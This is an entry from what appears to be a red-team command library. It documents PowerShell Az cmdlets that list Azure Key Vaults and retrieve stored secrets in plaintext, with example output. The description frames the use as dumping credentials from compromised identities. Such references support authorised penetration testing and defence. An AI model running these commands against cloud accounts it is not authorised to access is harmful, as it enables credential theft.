---
id: cc7b10d4-1809-4e63-8cbb-f0726940ab7e
name: Query-Azure-Key-Vault-Secrets
type: command
executor: powershell
data: |-
  Get-AzKeyVault
  Get-AzKeyVaultSecret -VaultName $_VAULT_NAME
  Get-AzKeyVaultSecret -VaultName $_VAULT_NAME -Name $_SECRET_NAME -AsPlainText
output: null
created_at: '2023-05-24T18:03:17.783985+00:00'
updated_at: '2023-05-24T18:03:18.179034+00:00'
platforms:
  - Cloud
tags:
  - azure
  - key-vault
  - secrets
verified: true
validated: true
---

# Query-Azure-Key-Vault-Secrets

## Command

```powershell
Get-AzKeyVault
Get-AzKeyVaultSecret -VaultName $_VAULT_NAME
Get-AzKeyVaultSecret -VaultName $_VAULT_NAME -Name $_SECRET_NAME -AsPlainText
```

## Description

This command enumerates Azure Key Vaults and retrieves secret details or plaintext values using the authenticated Az session. Use after connecting to dump stored credentials from compromised identities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -VaultName $_VAULT_NAME | Name of the target Key Vault (e.g., ResearchKeyVault) | Yes (for secret queries) |
| -Name $_SECRET_NAME | Specific secret name to retrieve (e.g., Reader) | Yes (for single secret) |
| -AsPlainText | Returns the secret value in plaintext instead of base64 | No (use for readable output) |

## Examples

### Enumerate Vaults

```powershell
Get-AzKeyVault
```

### List Secrets in Vault

```powershell
Get-AzKeyVaultSecret -VaultName 'ResearchKeyVault'
```

### Retrieve Plaintext Secret

```powershell
Get-AzKeyVaultSecret -VaultName 'ResearchKeyVault' -Name 'Reader' -AsPlainText
```

## Expected Output

For Get-AzKeyVault:

```
VaultName         : ResearchKeyVault
ResourceGroupName : ...
Location          : eastus
...
```

For Get-AzKeyVaultSecret -AsPlainText:

```
Name    : Reader
Value   : supersecretpassword123
VaultName: ResearchKeyVault
...
```
Success: Secret values displayed. Failure: AccessDenied if RBAC insufficient.

## Related

- [[procedures/Access-Azure-Key-Vault-Using-Managed-Identity]]
- [[commands/Connect-to-Azure-with-Access-Token]]
